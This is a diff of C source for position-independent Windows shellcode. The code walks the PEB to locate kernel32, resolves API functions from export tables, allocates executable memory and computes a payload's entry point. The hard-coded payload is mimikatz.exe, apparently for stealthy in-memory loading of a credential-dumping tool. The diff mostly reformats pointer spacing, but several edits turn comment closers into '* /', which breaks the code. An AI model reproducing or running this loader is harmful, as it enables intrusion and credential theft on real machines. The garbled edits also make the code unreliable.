@@ -14,12 +14,12 @@
 #pragma comment(lib, "KtmW32.lib")
 #pragma comment(lib, "ws2_32.lib")
 
-BOOL my_strcmp(char *s1, char *s2, int length);
+BOOL my_strcmp(char* s1, char* s2, int length);
 int my_wstrlen(PWCHAR str);
-int my_strlen(char *str);
+int my_strlen(char* str);
 HMODULE find_kernel32(void);
-FARPROC find_function(HMODULE module, char *name);
-ULONGLONG get_entry_point(BYTE *lpPayloadBuffer, MY_PPEB remotePeb);
+FARPROC find_function(HMODULE module, char* name);
+ULONGLONG get_entry_point(BYTE* lpPayloadBuffer, MY_PPEB remotePeb);
 
 int __stdcall shellcode(void)
 {
@@ -49,7 +49,7 @@ int __stdcall shellcode(void)
                                  '0','0','0','0','0','0','0','0','0','0','0','0','0',
                                  '0','0','0','0','0','0','0','0','0','0','0','0','0',
                                };
-    BYTE  *lpPayloadBuffer = 0xeeeeeeeeffffffff;
+    BYTE * lpPayloadBuffer = 0xeeeeeeeeffffffff;
     DWORD STATUS_SUCCESS = 0;
     WCHAR payload[] = { 'C',':','\\','u','s','e','r','s','\\','w','v','b','o','x','\\','d','e','s','k','t','o','p','\\','m','i','m','i','k','a','t','z','.','e','x','e','\0' };
     WCHAR directory[] = { 'C',':','\\','w','i','n','d','o','w','s','\\','s','y','s','t','e','m','3','2','\0' };
@@ -350,9 +350,9 @@ error:
 }
 
 /*
- * Open a file and read its content to copy it into memory.
- * Returns a pointer to the allocated buffer, and its size in the corresponding parameter.
- *
+*  Open a file and read its content to copy it into memory.
+*  Returns a pointer to the allocated buffer, and its size in the corresponding parameter.
+*
 LPVOID file_to_buffer(LPWSTR payload, LPDWORD payloadSize)
 {
 	HANDLE hPayloadFile;
@@ -398,13 +398,13 @@ LPVOID file_to_buffer(LPWSTR payload, LPDWORD payloadSize)
 	if ( !(hHeap = _getProcessHeap()) )
 		return NULL;
 
-	//lpPayloadBuffer = HeapAlloc(hHeap, HEAP_ZERO_MEMORY, *payloadSize);
-	lpPayloadBuffer = _virtualAlloc(NULL, *payloadSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+	//lpPayloadBuffer = HeapAlloc(hHeap, HEAP_ZERO_MEMORY,* payloadSize);
+	lpPayloadBuffer = _virtualAlloc(NULL,* payloadSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
 	if (!lpPayloadBuffer)
 		return NULL;
 
 	// Put file content into memory.
-	if (!_readFile(hPayloadFile, lpPayloadBuffer, *payloadSize, &bytesRead, NULL))
+	if (!_readFile(hPayloadFile, lpPayloadBuffer,* payloadSize, &bytesRead, NULL))
 		return NULL;
 
 	_closeHandle(hPayloadFile);
@@ -413,10 +413,10 @@ LPVOID file_to_buffer(LPWSTR payload, LPDWORD payloadSize)
 }
 */
 
-ULONGLONG get_entry_point(BYTE *lpPayloadBuffer, MY_PPEB remotePeb)
+ULONGLONG get_entry_point(BYTE* lpPayloadBuffer, MY_PPEB remotePeb)
 {
-    IMAGE_DOS_HEADER *dosHeader = NULL;
-    IMAGE_NT_HEADERS64 *peHeader = NULL;
+    IMAGE_DOS_HEADER* dosHeader = NULL;
+    IMAGE_NT_HEADERS64* peHeader = NULL;
     ULONGLONG entryPoint = NULL;
     ULONGLONG imageBase = NULL;
     DWORD offset = 0;
@@ -449,17 +449,17 @@ ULONGLONG get_entry_point(BYTE *lpPayloadBuffer, MY_PPEB remotePeb)
 
 
 /**************************************************************************************
- * Utility functions needed to create a position independent shellcode.				  *
- *																					  *
- * More details about some of these function can be found at :						  *
- *	https://nickharbour.wordpress.com/2010/07/01/writing-shellcode-with-a-c-compiler/ *
- *																					  *
- **************************************************************************************/
+*  Utility functions needed to create a position independent shellcode.				 *
+* 																					 *
+*  More details about some of these function can be found at :						 *
+* 	https://nickharbour.wordpress.com/2010/07/01/writing-shellcode-with-a-c-compiler/*
+* 																					 *
+* *************************************************************************************/
 
 /*
- * Case insensitive string comparison.
- */
-BOOL my_strcmp(char *s1, char *s2, int length)
+*  Case insensitive string comparison.
+* /
+BOOL my_strcmp(char* s1, char* s2, int length)
 {
     int x = 0;
 
@@ -480,8 +480,8 @@ BOOL my_strcmp(char *s1, char *s2, int length)
 }
 
 /*
- * Count the number of char in a unicode string.
- */
+*  Count the number of char in a unicode string.
+* /
 int my_wstrlen(PWCHAR str)
 {
     int len = 0;
@@ -491,7 +491,7 @@ int my_wstrlen(PWCHAR str)
     return len;
 }
 
-int my_strlen(char *str)
+int my_strlen(char* str)
 {
     int len = 0;
 
@@ -503,7 +503,7 @@ int my_strlen(char *str)
 HMODULE find_kernel32(void)
 {
     PPEB peb = NULL;
-    LDR_DATA_TABLE_ENTRY *module_ptr = NULL, *first_mod = NULL;
+    LDR_DATA_TABLE_ENTRY* module_ptr = NULL,* first_mod = NULL;
     WCHAR str[] = { 'k', 'e', 'r', 'n', 'e', 'l', '3', '2', '.', 'd', 'l', 'l', '\0'  };
 
     // Get PEB
@@ -527,25 +527,25 @@ HMODULE find_kernel32(void)
     return NULL;
 }
 
-FARPROC find_function(HMODULE module, char *name)
+FARPROC find_function(HMODULE module, char* name)
 {
-    IMAGE_DOS_HEADER *dos_header = NULL;
-    IMAGE_NT_HEADERS *nt_headers = NULL;
-    IMAGE_EXPORT_DIRECTORY *export_dir = NULL;
-    WORD *nameords = NULL;
-    int *names = NULL, *funcs = NULL;
+    IMAGE_DOS_HEADER* dos_header = NULL;
+    IMAGE_NT_HEADERS* nt_headers = NULL;
+    IMAGE_EXPORT_DIRECTORY* export_dir = NULL;
+    WORD* nameords = NULL;
+    int* names = NULL,* funcs = NULL;
     int i = 0;
 
-    dos_header = (IMAGE_DOS_HEADER *)module;
-    nt_headers = (IMAGE_NT_HEADERS *)((char *)module + dos_header->e_lfanew);
-    export_dir = (IMAGE_EXPORT_DIRECTORY *)((char *)module + nt_headers->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
-    names = (int *)((char*)module + export_dir->AddressOfNames);
-    funcs = (int *)((char*)module + export_dir->AddressOfFunctions);
-    nameords = (WORD *)((char*)module + export_dir->AddressOfNameOrdinals);
+    dos_header = (IMAGE_DOS_HEADER* )module;
+    nt_headers = (IMAGE_NT_HEADERS* )((char* )module + dos_header->e_lfanew);
+    export_dir = (IMAGE_EXPORT_DIRECTORY* )((char* )module + nt_headers->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
+    names = (int* )((char*)module + export_dir->AddressOfNames);
+    funcs = (int* )((char*)module + export_dir->AddressOfFunctions);
+    nameords = (WORD* )((char*)module + export_dir->AddressOfNameOrdinals);
 
     for (i = 0; i < export_dir->NumberOfNames; i++)
     {
-        char *str = (char *)module + names[i];
+        char* str = (char* )module + names[i];
         int length = my_strlen(name);
 
         if (!my_strcmp(str, name, length))
@@ -564,7 +564,7 @@ void __declspec() END_SHELLCODE(void) {}
 
 int main(void)
 {
-    FILE *output = NULL;
+    FILE* output = NULL;
 
     shellcode();
     puts("[+] Starting..");
